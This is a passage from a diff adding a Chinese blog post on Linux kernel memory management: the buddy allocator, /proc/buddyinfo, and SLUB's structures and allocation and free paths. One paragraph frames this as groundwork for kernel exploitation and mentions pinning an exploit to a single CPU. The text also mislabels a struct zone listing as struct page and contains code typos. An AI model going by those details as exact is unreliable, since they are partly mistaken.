+</span></span><span class="line"><span class="cl">Node 0, zone    DMA32    <span class="m">972</span>    <span class="m">770</span>    <span class="m">765</span>    <span class="m">608</span>    <span class="m">534</span>    <span class="m">479</span>    <span class="m">430</span>    <span class="m">393</span>    <span class="m">346</span>    <span class="m">272</span>    <span class="m">637</span>
+</span></span><span class="line"><span class="cl">Node 0, zone   Normal    <span class="m">928</span>   <span class="m">1134</span>   <span class="m">1630</span>    <span class="m">811</span>    <span class="m">506</span>    <span class="m">217</span>    <span class="m">102</span>     <span class="m">42</span>     <span class="m">23</span>    <span class="m">294</span>   <span class="m">1519</span>
+</span></span></code></pre></div><ol>
+<li>
+<p>Linux内核使用二进制伙伴算法来管理和分配物理内存页面。伙伴系统是结合 2 的方幂个分配和空闲缓冲区合并技术的内存分配方案。</p>
+</li>
+<li>
+<p>系统内存中每个物理内存页，，对应 struct page 实例，每个内存域都关联一个 struct zone 的实例，其中保存用于关联伙伴数据的主要数组。</p>
+</li>
+</ol>
+<p><img alt="buddy" decoding="async" loading="lazy" src="https://hammertux.github.io/img/buddy.png" style="max-width: 100%; height: auto;"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">zone</span> <span class="p">{</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">free_area</span>    <span class="n">free_area</span><span class="p">[</span><span class="n">NR_PAGE_ORDERS</span><span class="p">];</span>
+</span></span></code></pre></div><p>free_area 是伙伴系统的辅助数据结构。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">free_area</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">list_head</span>    <span class="n">free_list</span><span class="p">[</span><span class="n">MIGRATE_TYPES</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">nr_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>free_list：用于连接空闲页的链表，页链表包含大小相同的连续内存区。</p>
+<p>nr_free：指定当前内存区中空闲页块的数目（对0阶内存逐页计算，对1阶内存区计算页对的数目，对2阶内存区计算4页的数目，依此类推）</p>
+<p>内存分配的数量单位，内存块的长度为 2^0，order，其中 order 的规范从 0 到 MAX_ORDER。</p>
+<p>最大阶  MAX_ORDER 与  FORCE_MAX_ZONEORDER 配置选项，MAX_ORDER 默认定义为 11，请求的页数最大是 2^11=2048</p>
+<p>伙伴系统的当前状态可以通过以下命令查询：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ cat /proc/buddyinfo
+</span></span><span class="line"><span class="cl">Node 0, zone      DMA      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">0</span>      <span class="m">1</span>      <span class="m">3</span>
+</span></span><span class="line"><span class="cl">Node 0, zone    DMA32      <span class="m">4</span>      <span class="m">4</span>      <span class="m">6</span>      <span class="m">4</span>      <span class="m">7</span>      <span class="m">6</span>      <span class="m">6</span>      <span class="m">6</span>      <span class="m">5</span>      <span class="m">3</span>    <span class="m">958</span>
+</span></span><span class="line"><span class="cl">Node 0, zone   Normal   <span class="m">4805</span>   <span class="m">6916</span>   <span class="m">3296</span>   <span class="m">1446</span>    <span class="m">672</span>    <span class="m">330</span>    <span class="m">117</span>     <span class="m">40</span>      <span class="m">6</span>     <span class="m">22</span>   <span class="m">3622</span>
+</span></span></code></pre></div><h3 id="slub-分配器">Slub 分配器<a hidden class="anchor" aria-hidden="true" href="#slub-分配器">#</a></h3>
+<p>上面说到，由于效率原因，伙伴系统中分配内存是以页为单位的，即使所分配的object大小为1byte，也需要分配一页，这样就导致了比较大的内存碎片。因此Linux引入了Slab分配器，加速对object的分配和释放速度，同时也减少碎片空间。</p>
+<p>最初接触的时候心里通常有个大大的问号：Slab是什么？理解这个问题至关重要，经过翻阅多种资料和文章，可以大概这么回答：</p>
+<ol>
+<li>Slab是一种缓存策略</li>
+<li>Slab是一片缓冲区</li>
+<li>Slab是一个或者多个连续的page</li>
+</ol>
+<p>slab 的内存来自于 buddy，slab 相当于二级管理器。slab 和 buddy 算法上级别对等，两个都是内存分配器。buddy 是把内存条分成多个 zone 来管理分配，slab 是从 buddy 拿到的内存，进行管理分配。</p>
+<p>CPU 请求虚拟地址，MMU 根据 CPU 请求的虚拟地址，查找页表获取物理地址。Buddy 算法管理页，两个虚拟地址可以映射到同一个物理地址。</p>
+<p>API 接口：分配内存 kmalloc、重新分配内存 krealloc、释放内存 kfree。</p>
+<ul>
+<li>slab 是一种缓存策略</li>
+<li>slab 是一片缓冲区</li>
+<li>slab 是一个或者多个连续的page</li>
+</ul>
+<p>slab allocator 一共有三种版本：</p>
+<ul>
+<li>slab（最初的版本）</li>
+<li>slob（用于嵌入式等场景的极为简化的版本）</li>
+<li>slub（优化后的版本，现在是通用版本）</li>
+</ul>
+<h4 id="数据结构">数据结构<a hidden class="anchor" aria-hidden="true" href="#数据结构">#</a></h4>
+<p><img alt="image-20260206235413781" decoding="async" loading="lazy" src="./assets/image-20260206235413781.png" style="max-width: 100%; height: auto;"></p>
+<p>与用户态的<code>chunk</code>对应的（只是类似，并不是完全对应），<code>kernel</code>中有一个结构体叫做<code>object</code>。它即为<code>slub allocator</code>分配的基本单元。而与用户态对应的<code>bins</code>分为两种，一个叫做<code>kmem_cache_cpu</code>，而另一种叫做<code>kmem_cache_node</code>，它们将管理我们提到的<code>object</code>。</p>
+<p>简要介绍一下<code>kmem_cache_cpu</code>。<code>kmem_cache_cpu</code>是一个**<code>percpu</code>变量**（这意味着，每个<code>CPU</code>上都独立有一份<code>kmem_cache_cpu</code>的副本，通过<code>gs</code>寄存器作为<code>percpu</code>基址进行寻址），表示当前<code>CPU</code>使用的<code>slub</code>，直接从当前<code>CPU</code>来存取<code>object</code>，不需要加锁，能够提高性能。然而这对于我们在<code>Linux Kernel Pwn</code>中，只会成为负担，毕竟我们并不希望额外考虑当前正在使用哪个<code>CPU</code>~。因此，我们在利用前，可以将我们的程序绑定到某个<code>CPU</code>上，即可无视掉这条规则。</p>
+<p>而对于<code>kmem_cache_node</code>，它包括两个链表，其中一个叫做<code>partial</code>，另一个叫做<code>full</code>。顾名思义，<code>partial</code>链表中，存在部分空闲的<code>object</code>；而<code>full</code>链表中，全部<code>object</code>都已经被分配了。</p>
+<p>伙伴系统分配内存是以 page 为单位，实际开发中很多要求是 byte 为单位。slab 分配器就是用来解决下内存块分配的问题。</p>
+<p>描述一个页的数据结构就是<code>struct page</code>。为了节省空间，page使用了大量的 union 结构，针对不同用处的页使用不同的字段。</p>
+<p>slab 是一个或者多个连续页组成的内存空间，那么本质上执行一个 slab 的数据结构不是别的，就是<code>struct page*</code>，对应 slab 中的信息可以通过第一个 page 的某些字段描述，记住这点对后面的理解很重要。</p>
+<p>内核用<code>struct page</code>结构表示系统中的每个物理页，该结构位于<code>&lt;linux/mm_types.h&gt;</code>中：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">zone</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">_watermark</span><span class="p">[</span><span class="n">NR_WMARK</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">watermark_boost</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nr_reserved_highatomic</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nr_free_highatomic</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">long</span> <span class="n">lowmem_reserve</span><span class="p">[</span><span class="n">MAX_NR_ZONES</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_NUMA
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">int</span> <span class="n">node</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="k">struct</span> <span class="n">pglist_data</span>	<span class="o">*</span><span class="n">zone_pgdat</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">per_cpu_pages</span>	<span class="n">__percpu</span> <span class="o">*</span><span class="n">per_cpu_pageset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">per_cpu_zonestat</span>	<span class="n">__percpu</span> <span class="o">*</span><span class="n">per_cpu_zonestats</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">pageset_high_min</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">pageset_high_max</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">pageset_batch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifndef CONFIG_SPARSEMEM
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="o">*</span><span class="n">pageblock_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif </span><span class="cm">/* CONFIG_SPARSEMEM */</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">zone_start_pfn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">atomic_long_t</span>		<span class="n">managed_pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">spanned_pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">present_pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#if defined(CONFIG_MEMORY_HOTPLUG)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">present_early_pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_CMA
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">cma_pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="kt">char</span>		<span class="o">*</span><span class="n">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_MEMORY_ISOLATION
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">nr_isolate_pageblock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_MEMORY_HOTPLUG
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">seqlock_t</span>		<span class="n">span_seqlock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">initialized</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="cm">/* Write-intensive fields used from the page allocator */</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">CACHELINE_PADDING</span><span class="p">(</span><span class="n">_pad1_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="cm">/* free areas of different sizes */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">free_area</span>	<span class="n">free_area</span><span class="p">[</span><span class="n">NR_PAGE_ORDERS</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_UNACCEPTED_MEMORY
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="k">struct</span> <span class="n">list_head</span>	<span class="n">unaccepted_pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">spinlock_t</span>		<span class="n">lock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">CACHELINE_PADDING</span><span class="p">(</span><span class="n">_pad2_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">percpu_drift_mark</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#if defined CONFIG_COMPACTION || defined CONFIG_CMA
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="cm">/* pfn where compaction free scanner should start */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">compact_cached_free_pfn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* pfn where compaction migration scanner should start */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">compact_cached_migrate_pfn</span><span class="p">[</span><span class="n">ASYNC_AND_SYNC</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">compact_init_migrate_pfn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span>		<span class="n">compact_init_free_pfn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_COMPACTION
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">compact_considered</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span>		<span class="n">compact_defer_shift</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span>			<span class="n">compact_order_failed</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#if defined CONFIG_COMPACTION || defined CONFIG_CMA
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">bool</span>			<span class="n">compact_blockskip_flush</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="kt">bool</span>			<span class="n">contiguous</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">CACHELINE_PADDING</span><span class="p">(</span><span class="n">_pad3_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* Zone statistics */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">atomic_long_t</span>		<span class="n">vm_stat</span><span class="p">[</span><span class="n">NR_VM_ZONE_STAT_ITEMS</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">atomic_long_t</span>		<span class="n">vm_numa_event</span><span class="p">[</span><span class="n">NR_VM_NUMA_EVENT_ITEMS</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">____cacheline_internodealigned_in_smp</span><span class="p">;</span>
+</span></span></code></pre></div><ul>
+<li><code>lock</code>：自旋锁，它防止该结构被并发访问。注意，这个域只保护结构，而不保护驻留在这个区中的所有页。没有特定的锁来保护单个页，但是，部分内核可用锁住在页中驻留的数据。</li>
+<li><code>watermark</code>数组持有该区的最小值、最低和最高水位值。内核使用水位为每个内存区设置合适的内存消耗基准。该水位随空闲内存的多少而变化。</li>
+<li><code>name</code>：以 NULL 结束的字符串表示这个区的名字。内核启动期间初始化这个值，其代码位于<code>mm/page_alloc.c</code>中。三个区的名字分别为“DMA”、“Normal”和“HighMem”。</li>
+</ul>
+<p>内核用这一结构来管理系统中所有的页，因为内核需要知道一个页是否空闲。如果页已经被分配，内核还需要知道谁拥有这个页。拥有者可能是用户空间进程动态分配的内核数据、静态内核代码或页高速缓存等。</p>
+<p><img alt="image-20260206235039001" decoding="async" loading="lazy" src="./assets/image-20260206235039001.png" style="max-width: 100%; height: auto;"></p>
+<h4 id="分配和释放">分配和释放<a hidden class="anchor" aria-hidden="true" href="#分配和释放">#</a></h4>
+<p>终于讲到了重点。关于slub的分配和释放有很多文章介绍过，而且风格不同，有的是对着代码逐行分析，有的是画图介绍，这里我仅按照我自己的理解去说，如有谬误欢迎指出。</p>
+<p>对象的分配和释放涉及到几个指针，分别是：</p>
+<ul>
+<li>p1: 对象的虚拟地址(<code>void *</code>)</li>
+<li>p2: 对象地址所对应的page(<code>struct page*</code>)</li>
+<li>p3: 对象所属的slab(<code>struct page*</code>)</li>
+<li>p4: 对象所属的cache控制体(<code>struct kmem_cache*</code>)</li>
+</ul>
+<p>一个虚地址所对应的页首地址是是通过PAGE_MASK，因为页是对齐的，但需要注意页首地址并不是page指针所指向的地方。p1-&gt;p2的转换通过<code>virt_to_page</code>实现。</p>
+<p>p2-&gt;p4可以通过<code>page-&gt;slab_cache</code>得到，这也是p1-&gt;p4函数<code>virt_to_cache</code>的操作。</p>
+<h4 id="分配">分配<a hidden class="anchor" aria-hidden="true" href="#分配">#</a></h4>
+<p>首先，<code>slub allocator</code>从<code>kmem_cache_cpu</code>上取<code>object</code>，若<code>kmem_cache_cpu</code>上存在，则直接返回；</p>
+<p>若<code>kmem_cache_cpu</code>上的<code>slub</code>无空闲对象了，那么该<code>slub</code>会被加入到<code>kmem_cache_node</code>中的<code>full</code>链表，并从<code>partial</code>链表中取一个<code>slub</code>挂载到<code>kmem_cache_cpu</code>上，然后重复第一步的操作，取出<code>object</code>并返回。</p>
+<p>若<code>kmem_cache_cpu</code>的<code>partial</code>链表也空了，那么会向<code>buddy system</code>请求分配新的内存页，划分为多个<code>object</code>，并给到<code>kmem_cache_cpu</code>，取出<code>object</code>并返回。</p>
+<p>对象的分配，不考虑特殊情况的话(比如超过N页的对象直接通过伙伴系统分配)，一般流程如下：</p>
+<ol>
+<li><code>kmem_cache_cpu-&gt;freelist</code>不为空，直接出链返回；</li>
+<li><code>kmem_cache_cpu-&gt;page-&gt;freelist</code>不为空，则出链，更新cpu_slab-&gt;freelist，然后返回；</li>
+<li><code>kmem_cache_cpu-&gt;partial</code>不为空，取出第一个slab，更新cpu_slab的freelist和page，取出对象然后返回；</li>
+<li><code>kmem_cache_node-&gt;partial</code>不为空，取出第一个，类似3更新cpu_slab的freelist和page并返回；</li>
+<li>上面都是空的，则通过伙伴系统分配新的slab，挂到kmem_cache_cpu中，然后goto 1；</li>
+</ol>
+<p><img alt="slab_alloc" decoding="async" loading="lazy" src="https://evilpan.com/img/2020-03-21-linux-slab/1.png" style="max-width: 100%; height: auto;"></p>
+<h4 id="释放">释放<a hidden class="anchor" aria-hidden="true" href="#释放">#</a></h4>
+<p>释放过程需要看被释放的<code>object</code>属于的<code>slub</code>现在位于哪里。</p>
+<p>若其<code>slub</code>现在位于<code>kmem_cache_cpu</code>，则直接头插法插入当前<code>kmem_cache_cpu</code>的<code>freelist</code>链表。</p>
+<p>若其<code>slub</code>属于<code>kmem_cache_node</code>的<code>partial</code>链表上的<code>slub</code>，则同样通过头插法插入对应的<code>slub</code>中的<code>freelist</code>。</p>
+<p>若其<code>slub</code>属于<code>kmem_cache_node</code>的<code>full</code>链表上的<code>slub</code>，则会使其成为对应<code>slub</code>的<code>freelist</code>的头结点，并将该<code>slub</code>从<code>full</code>链表迁移到<code>partial</code>。</p>
+<p>对象的释放相对复杂，和释放之前对象所处的位置以及释放后cache情况有关。假设待释放的object地址为p1，p1对应的page为p2，p1对应的slab为p3，参考上面的几个指针定义，大致有以下路径：</p>
+<ol>
+<li><code>p3</code>就是当前CPU的kmem_cache_cpu-&gt;freelist所对应的slab，即p1位于当前cpu的kmem_cache_cpu-&gt;freelist所在的page中(<code>p2 == cpu_slab-&gt;page</code>)，此时可以直接释放到freelist上并返回；</li>
+<li><code>p3</code>位于当前CPU的kmem_cache_cpu-&gt;partial链表中，或者其他CPU的kmem_cache_cpu-&gt;freelist/partial中。此slab处于冻结状态，将p1链入p3-&gt;freelist中；</li>
+<li><code>p3</code>位于kmem_cache_node-&gt;partial链表中，此时释放分为两种情况：</li>
+</ol>
+<ul>
+<li>3.1 释放p1后，p3的状态为半满。此时正常将p1链入p3的freelist中。</li>
+<li>3.2 释放p1后，p3的状态为全空。此时除了将p1链入p3的freelist以外，还需要判断node中slab数是否超过规定值(<code>node-&gt;nr_partial &gt;= min_partial</code>)。如果超过则需要将p3移出node-&gt;partial链表，并将p3释放给伙伴系统。</li>
+</ul>
+<ol start="4">
+<li><code>p3</code>是一个全满的slab，不被任何kmem_cache管理。释放后p3变成一个半满的slab(更新freelist)，同时p3会被加入到当前CPU的kmem_cache_cpu.partial中。加入之前需要判断cpu partial中的空闲对象是否超过了规定值(<code>partial.pobjects &gt; cachep.cpu_partial</code>)，并进行相应的处理：</li>
+</ol>
+<ul>
+<li>4.1 如果没超过，直接链入cpu partial即可</li>
+<li>4.2 如果超过，则将cpu partial中所有slab解冻，将其中所有半满的slab交由node进行管理；将其中所有空的slab回收给伙伴系统；最后再将slab链入到partial中。</li>
+</ul>
+<p>其中3的判断是为了避免node partial中存放了太多空slab；4的判断是为了避免cpu partial中存放太多空slab以及加快搜索速度。</p>
+<p><img alt="slab_free" decoding="async" loading="lazy" src="https://evilpan.com/img/2020-03-21-linux-slab/2.png" style="max-width: 100%; height: auto;"></p>
+<p>slab分配和释放的过程大致就是这样，上面的图主要来自窝窝的smcdef大神，其中还有一张大图可以配合观看理解：<a href="http://www.wowotech.net/content/uploadfile/201803/4a471520078976.png">http://www.wowotech.net/content/uploadfile/201803/4a471520078976.png</a></p>
+<ul>
+<li>创建 slab 描述符：<code>*kmem_cache_create()</code></li>
+</ul>
+<pre tabindex="0"><code></code></pre><ul>
+<li>释放 slab 描述符：<code>kmem_cache_destroy()</code></li>
+</ul>
+<pre tabindex="0"><code></code></pre><ul>
+<li>分配缓存对象：<code>*kmem_cache_alloc()</code></li>
+</ul>
+<pre tabindex="0"><code></code></pre><ul>
+<li>释放缓存对象：<code>kmem_cache_free()</code></li>
+</ul>
+<p>slab 分配器最终还是由伙伴系统来分配出实际的物理页面。</p>
+<p>往往我们在日常使用中并不需要一整页。用于替代我们向 buddy system 请求物理页，并分割为多个小的 object，当我们每次需要时只需要取一个 object 即可。</p>
+<p><a href="https://bbs.kanxue.com/elink@0dbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2"><img alt="hNJNh6.png" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202109/876323_ZZZ5Y4KW362VUP9.jpg" style="max-width: 100%; height: auto;"></a></p>
+<pre tabindex="0"><code>//创建和消耗一个kmem_cache
+struct keme_cache *kmem_cache_create()
+struct keme_cache *kmem_cache_create_usercopy()
+    
+int kmem_cache_destroy(struct kmeme_cache * cachep);
+
+//从keme_cache 对应的 slab 中分配一个 object
+void* kmem_cache_alloc(struct kmeme_cache * cachep)
+
+//释放object 给原先的slab
+void kmem_cache_free(struct kmeme_cache * cachep)
+</code></pre><h4 id="kmem_cache">kmem_cache<a hidden class="anchor" aria-hidden="true" href="#kmem_cache">#</a></h4>
+<p>kmem_cache是Slab的主要管理结构，申请和释放对象都需要经过该结构操作，部分重要字段如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">   * Slab cache management.
+</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">kmem_cache</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">struct</span> <span class="n">kmem_cache_cpu</span> <span class="n">__percpu</span> <span class="o">*</span><span class="n">cpu_slab</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Used for retriving partial slabs etc */</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">min_partial</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>       <span class="cm">/* The size of an object including meta data */</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">object_size</span><span class="p">;</span>    <span class="cm">/* The size of an object without meta data */</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">offset</span><span class="p">;</span>     <span class="cm">/* Free pointer offset. */</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">#ifdef CONFIG_SLUB_CPU_PARTIAL
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="kt">int</span> <span class="n">cpu_partial</span><span class="p">;</span>    <span class="cm">/* Number of per cpu partial objects to keep around */</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="p">...</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">struct</span> <span class="n">kmem_cache_node</span> <span class="o">*</span><span class="n">node</span><span class="p">[</span><span class="n">MAX_NUMNODES</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>重点关注<code>cpu_slab</code>和<code>node</code>。</p>
+<p><code>cpu_slab</code>包含当前CPU的Slab。这是个<code>__percpu</code>的对象，什么意思呢？我的理解是内核为了加速当前CPU的访问，会对每个CPU保存一个变量，这样在当前CPU访问该变量时候就可以免去加锁的开销。在调试中发现该变量的值是个类似<code>0x18940</code>这样比较小的数，这个地址是没有映射的，访问percpu变量需要通过<code>raw_cpu_ptr</code>宏去获取实际的地址。</p>
+<p><code>node</code>数组中包括其他CPU的Slab。为什么叫做node？其实这是NUMA系统中的node概念。NUMA是为了多核优化而产生的架构，可以令某个CPU访问某段内存的速度更快。node的定义是“一段内存，其中每个字节到CPU的距离相等”，更加通俗的解释是：“在同一物理总线上的内存+CPUs+IO+……”，更多细节可以参考<a href="http://lse.sourceforge.net/numa/faq/index.html#what_is_a_node">NUMA FAQ</a>。</p>
+<h4 id="kmem_cache_cpu">kmem_cache_cpu<a hidden class="anchor" aria-hidden="true" href="#kmem_cache_cpu">#</a></h4>
+<p>cpu_slab是<code>kmem_cache_cpu</code>结构，如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">kmem_cache_cpu</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">void</span> <span class="o">**</span><span class="n">freelist</span><span class="p">;</span>    <span class="cm">/* Pointer to next available object */</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">tid</span><span class="p">;</span>  <span class="cm">/* Globally unique transaction id */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>  <span class="cm">/* The slab from which we are allocating */</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">#ifdef CONFIG_SLUB_CPU_PARTIAL
